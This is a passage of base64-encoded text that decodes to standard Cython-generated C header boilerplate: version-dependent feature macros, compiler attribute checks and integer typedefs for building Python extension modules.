0FTU1VNRV9TQUZFX01BQ1JPUyAwXG4gICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDBcbiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDBcbiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMClcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklOR1xuICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwKVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQ1xuICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwXG4jZWxzZVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDBcbiAgI2lmZGVmIFB5X0dJTF9ESVNBQkxFRFxuICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMVxuICAjZWxzZVxuICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfVFlQRV9TTE9UUylcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAxXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDFcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyB8fCBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMEEyXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMpXG4gICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTFxuICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX0ZBU1RfR0lMKVxuICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTYpXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQjEpXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAxXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTUgJiYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFKVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQ1xuICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAoIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HKVxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNDQUxMXG4jZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0NBTEwgIENZVEhPTl9GQVNUX1BZQ0FMTFxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9WRUNUT1JDQUxMXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBDWVRIT05fVkVDVE9SQ0FMTCAgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMClcbiNlbHNlXG4jZGVmaW5lIENZVEhPTl9WRUNUT1JDQUxMICAoQ1lUSE9OX0ZBU1RfUFlDQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMEIxKVxuI2VuZGlmXG4jZW5kaWZcbiNkZWZpbmUgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgKENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBCMSlcbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgI3VuZGVmIFNISUZUXG4gICN1bmRlZiBCQVNFXG4gICN1bmRlZiBNQVNLXG4gICNpZmRlZiBTSVpFT0ZfVk9JRF9QXG4gICAgZW51bSB7IF9fcHl4X2NoZWNrX3NpemVvZl92b2lkcCA9IDEgLyAoaW50KShTSVpFT0ZfVk9JRF9QID09IHNpemVvZih2b2lkKikpIH07XG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9MT0NLX0FORF9HSUxfREVBRExPQ0tfQVZPSURBTkNFX1RJTUVcbiAgI2RlZmluZSBDWVRIT05fTE9DS19BTkRfR0lMX0RFQURMT0NLX0FWT0lEQU5DRV9USU1FIDEwMFxuI2VuZGlmXG4jaWZuZGVmIF9faGFzX2F0dHJpYnV0ZVxuICAjZGVmaW5lIF9faGFzX2F0dHJpYnV0ZSh4KSAwXG4jZW5kaWZcbiNpZm5kZWYgX19oYXNfY3BwX2F0dHJpYnV0ZVxuICAjZGVmaW5lIF9faGFzX2NwcF9hdHRyaWJ1dGUoeCkgMFxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9SRVNUUklDVFxuICAjaWYgZGVmaW5lZChfX0dOVUNfXylcbiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCBfX3Jlc3RyaWN0X19cbiAgI2VsaWYgZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTQwMFxuICAgICNkZWZpbmUgQ1lUSE9OX1JFU1RSSUNUIF9fcmVzdHJpY3RcbiAgI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgcmVzdHJpY3RcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVFxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVU5VU0VEXG4gICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKVxuICAgIFxuICAgICNpZiAoKGRlZmluZWQoX01TVkNfTEFORykgJiYgX01TVkNfTEFORyA+PSAyMDE3MDNMKSB8fCBfX2NwbHVzcGx1cyA+PSAyMDE3MDNMKVxuICAgICAgI2lmIF9faGFzX2NwcF9hdHRyaWJ1dGUobWF5YmVfdW51c2VkKVxuICAgICAgICAjZGVmaW5lIENZVEhPTl9VTlVTRUQgW1ttYXliZV91bnVzZWRdXVxuICAgICAgI2VuZGlmXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9VTlVTRURcbiMgaWYgZGVmaW5lZChfX0dOVUNfXylcbiMgICBpZiAhKGRlZmluZWQoX19jcGx1c3BsdXMpKSB8fCAoX19HTlVDX18gPiAzIHx8IChfX0dOVUNfXyA9PSAzICYmIF9fR05VQ19NSU5PUl9fID49IDQpKVxuIyAgICAgZGVmaW5lIENZVEhPTl9VTlVTRUQgX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKVxuIyAgIGVsc2VcbiMgICAgIGRlZmluZSBDWVRIT05fVU5VU0VEXG4jICAgZW5kaWZcbiMgZWxpZiBkZWZpbmVkKF9fSUNDKSB8fCAoZGVmaW5lZChfX0lOVEVMX0NPTVBJTEVSKSAmJiAhZGVmaW5lZChfTVNDX1ZFUikpXG4jICAgZGVmaW5lIENZVEhPTl9VTlVTRUQgX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKVxuIyBlbHNlXG4jICAgZGVmaW5lIENZVEhPTl9VTlVTRURcbiMgZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVU5VU0VEX1ZBUlxuIyAgaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICAgdGVtcGxhdGU8Y2xhc3MgVD4gdm9pZCBDWVRIT05fVU5VU0VEX1ZBUiggY29uc3QgVCYgKSB7IH1cbiMgIGVsc2VcbiMgICAgZGVmaW5lIENZVEhPTl9VTlVTRURfVkFSKHgpICh2b2lkKSh4KVxuIyAgZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUlxuICAjZGVmaW5lIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHgpIENZVEhPTl9VTlVTRURfVkFSKHgpXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX05DUF9VTlVTRURcbiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuIyAgZGVmaW5lIENZVEhPTl9OQ1BfVU5VU0VEXG4jIGVsc2VcbiMgIGRlZmluZSBDWVRIT05fTkNQX1VOVVNFRCBDWVRIT05fVU5VU0VEXG4jIGVuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VTRV9DUFBfU1REX01PVkVcbiAgI2lmIGRlZmluZWQoX19jcGx1c3BsdXMpICYmIChcXFxuICAgIF9fY3BsdXNwbHVzID49IDIwMTEwM0wgfHwgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE2MDApKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9DUFBfU1REX01PVkUgMVxuICAjZWxzZVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9DUFBfU1REX01PVkUgMFxuICAjZW5kaWZcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF92b2lkX3RvX05vbmUodm9pZF9yZXN1bHQpICgodm9pZCkodm9pZF9yZXN1bHQpLCBQeV9JTkNSRUYoUHlfTm9uZSksIFB5X05vbmUpXG4jaWZkZWYgX01TQ19WRVJcbiAgICAjaWZuZGVmIF9NU0NfU1RESU5UX0hfXG4gICAgICAgICNpZiBfTVNDX1ZFUiA8IDEzMDBcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgY2hhciAgICAgdWludDhfdDtcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgc2hvcnQgICAgdWludDE2X3Q7XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGludCAgICAgIHVpbnQzMl90O1xuICAgICAgICAjZWxzZVxuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDggICB1aW50OF90O1xuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDE2ICB1aW50MTZfdDtcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQzMiAgdWludDMyX3Q7XG4gICAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAgICNpZiBfTVNDX1ZFUiA8IDEzMDBcbiAgICAgICAgI2lmZGVmIF9XSU42NFxuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBsb25nIGxvbmcgIF9fcHl4X3VpbnRwdHJfdDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgaW50ICAgICAgICBfX3B5eF91aW50cHRyX3Q7XG4gICAgICAgICNlbmRpZlxuICAgICNlbHNlXG4gICAgICAgICNpZmRlZiBfV0lONjRcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQ2NCAgICBfX3B5eF91aW50cHRyX3Q7XG4gICAgICAgICNlbHNlXG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MzIgICAgX19weXhfdWludHB0cl90O1xuICAgICAgICAjZW5kaWZcbiAgICAjZW5kaWZcbiNlbHNlXG4gICAgI2luY2x1ZGUgPHN0ZGludC5oPlxuICAgIHR5cGVkZWYgdWludHB0cl90ICBfX3B5eF91aW50cHRyX3Q7XG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKVxuICAgIFxuICAgICNpZiAoKGRlZmluZWQoX01TVkNfTEFORykgJiYgX01TVkNfTEFORyA+PSAyMDE3MDNMKSB8fCBfX2NwbHVzcGx1cyA+PSAyMDE3MDNMKVxuICAgICAgI2lmIF9faGFzX2NwcF9hdHRyaWJ1dGUoZmFsbHRocm91Z2gpXG4gICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbZmFsbHRocm91Z2hdXVxuICAgICAgI2VuZGlmXG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0hcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGNsYW5nOjpmYWxsdGhyb3VnaClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggW1tjbGFuZzo6ZmFsbHRocm91Z2hdXVxuICAgICAgI2VsaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShnbnU6OmZhbGx0aHJvdWdoKVxuICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2dudTo6ZmFsbHRocm91Z2hdXVxuICAgICAgI2VuZGlmXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNpZiBfX2hhc19hdHRyaWJ1dGUoZmFsbHRocm91Z2gpXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBfX2F0dHJpYnV0ZV9fKChmYWxsdGhyb3VnaCkpXG4gICAgI2Vsc2VcbiAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuICAjaWYgZGVmaW5lZChfX2NsYW5nX18pICYmIGRlZmluZWQoX19hcHBsZV9idWlsZF92ZXJzaW9uX18pXG4gICAgI2lmIF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fIDwgNzAwMDAwMFxuICAgICAgI3VuZGVmICBDWVRIT05fRkFMTFRIUk9VR0hcbiAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIFB5X1VOUkVBQ0hBQkxFXG4gICNkZWZpbmUgUHlfVU5SRUFDSEFCTEUoKSAgYXNzZXJ0KDApOyBhYm9ydCgpXG4jZW5kaWZcbiNpZmRlZiBfX2NwbHVzcGx1c1xuICB0ZW1wbGF0ZSA8dHlwZW5hbWUgVD5cbiAgc3RydWN0IF9fUFlYX0lTX1VOU0lHTkVEX0lNUEwge3N0YXRpYyBjb25zdCBib29sIHZhbHVlID0gVCgwKSA8IFQoLTEpO307XG4gICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKF9fUFlYX0lTX1VOU0lHTkVEX0lNUEw8dHlwZT46OnZhbHVlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1BZWF9JU19VTlNJR05FRCh0eXBlKSAoKCh0eXBlKS0xKSA+IDApXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgPT0gMVxuICAjZGVmaW5lIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCAgKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0ICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMClcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9SRUlOVEVSUFJFVF9GVU5DSU9OKGZ1bmNfcG9pbnRlciwgb3RoZXJfcG9pbnRlcikgKChmdW5jX3BvaW50ZXIpKHZvaWQoKikodm9pZCkpKG90aGVyX3BvaW50ZXIpKVxuXG5cbiNpZm5kZWYgQ1lUSE9OX0lOTElORVxuICAjaWYgZGVmaW5lZChfX2NsYW5nX18pXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lX18gX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKVxuICAjZWxpZiBkZWZpbmVkKF9fR05VQ19fKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZV9fXG4gICNlbGlmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lXG4gICNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTFxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBpbmxpbmVcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkVcbiAgI2VuZGlmXG4jZW5kaWZcblxuXG4jZGVmaW5lIF9fUFlYX0JVSUxEX1BZX1NTSVpFX1QgIm4iXG4jZGVmaW5lIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAieiJcbiNkZWZpbmUgX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSAiYnVpbHRpbnMiXG4jZGVmaW5lIF9fUHl4X0RlZmF1bHRDbGFzc1R5cGUgUHlUeXBlX1R5cGVcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgI2lmbmRlZiBDT19PUFRJTUlaRURcbiAgICBzdGF0aWMgaW50IENPX09QVElNSVpFRDtcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX05FV0xPQ0FMU1xuICAgIHN0YXRpYyBpbnQgQ09fTkVXTE9DQUxTO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fVkFSQVJHU1xuICAgIHN0YXRpYyBpbnQgQ09fVkFSQVJHUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX1ZBUktFWVdPUkRTXG4gICAgc3RhdGljIGludCBDT19WQVJLRVlXT1JEUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUlxuICAgIHN0YXRpYyBpbnQgQ09fQVNZTkNfR0VORVJBVE9SO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fR0VORVJBVE9SXG4gICAgc3RhdGljIGludCBDT19HRU5FUkFUT1I7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19DT1JPVVRJTkVcbiAgICBzdGF0aWMgaW50IENPX0NPUk9VVElORTtcbiAgICAjZW5kaWZcbiNlbHNlXG4gICAgI2lmbmRlZiBDT19DT1JPVVRJTkVcbiAgICAgICNkZWZpbmUgQ09fQ09ST1VUSU5FIDB4ODBcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUlxuICAgICAgI2RlZmluZSBDT19BU1lOQ19HRU5FUkFUT1IgMHgyMDBcbiAgICAjZW5kaWZcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEE0IHx8IGRlZmluZWQoUHlfSVNfVFlQRSlcbiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSBQeV9JU19UWVBFKG9iLCB0eXBlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSAoKChjb25zdCBQeU9iamVjdCopb2IpLT5vYl90eXBlID09ICh0eXBlKSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwQjEgfHwgZGVmaW5lZChQeV9JcylcbiAgI2RlZmluZSBfX1B5eF9QeV9Jcyh4LCB5KSAgUHlfSXMoeCwgeSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXMoeCwgeSkgKCh4KSA9PSAoeSkpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAw